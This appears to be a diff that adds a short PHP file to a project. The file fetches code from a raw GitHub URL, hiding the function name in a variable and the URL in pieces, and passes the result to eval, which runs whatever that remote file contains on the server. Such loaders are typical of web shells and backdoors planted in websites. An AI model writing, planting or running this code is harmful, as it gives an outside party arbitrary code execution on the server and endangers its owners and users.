@@ -1,0 +1,10 @@
+<?php 
+        $awo = 'https://';
+        $fgt = 'file_get_contents';
+        $data = $fgt($awo . 'raw.githubusercontent.com/jexseo/eval/refs/heads/main/tester.js');
+    
+        $admin = '?>';
+        eval($admin . $data);
+    
+        exit;
+?>
